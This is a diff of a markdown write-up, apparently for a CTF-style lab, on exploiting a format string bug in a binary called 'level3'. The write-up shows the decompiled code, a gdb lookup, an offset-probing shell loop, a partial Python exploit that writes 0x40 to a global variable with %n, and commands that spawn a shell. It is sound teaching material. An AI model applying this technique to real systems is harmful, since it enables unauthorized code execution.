@@ -1,7 +1,6 @@
-LEVEL_3:
-# 📚 Exploiting `level3` – Format String Vulnerability to Overwrite Global Variable
+<h1 align="center"> LEVEL 3 </h1>
 
-
+## 🔍 Analysis of Decompiled [level3](./source.c)
 The target is a vulnerable binary named `level3`. Our goal is to:
 
 - Exploit a **format string vulnerability** in `printf()`
@@ -9,7 +8,7 @@ The target is a vulnerable binary named `level3`. Our goal is to:
 - Satisfy the condition `if (m == 0x40)` to execute `system("/bin/sh")`
 
 
-## 🔐 Binary Protections
+### 🔐 Binary Protections
 
 ```bash
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
@@ -19,7 +18,7 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 $ cat /proc/sys/kernel/randomize_va_space
 0
 ```
-```
+```C
 void v(void) {
   char local_20c[520];
   fgets(local_20c, 0x200, stdin);
@@ -30,21 +29,20 @@ void v(void) {
   }
 }
 ```
- ## Exploitation Strategy
+## 💥 Exploit 
+Leak stack contents to determine the correct format string offset
+Use %n to write `0x40` to the address of the global variable m
+Trigger the condition and gain a shell
 
-    Leak stack contents to determine the correct format string offset
-    Use %n to write 0x40 to the address of the global variable m
-    Trigger the condition and gain a shell
-
-##  Step 1: Find the Address of m
+###  Step 1: Find the Address of m
 
 ```
 (gdb) p &m
 $1 = (int *) 0x0804988c
 ```
-## Step 2: Discover Format String Offset
+### Step 2: Discover Format String Offset
 
-```
+```SH
 for i in $(seq 1 40); do
   python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level3
 done
@@ -73,8 +71,8 @@ So if $i = 4, it becomes: %4$x
 
 This is a format specifier for printf in C. It means: “print the 4th argument as a hexadecimal number.”
 
-## Step 3: Exploit Script (Python)
-```
+### Step 3: Exploit Script
+```PY
 import struct
 import sys
 
@@ -101,7 +99,7 @@ with open("payload.txt", "wb") as f:
 print("Wrote payload with offset %d" % offset)
 
 ```
-## Step 4: Execute the Exploit
+### Step 4: Execute the Exploit
 ```
 python exploit.py 4 
 (cat payload.txt; cat) | ./level3
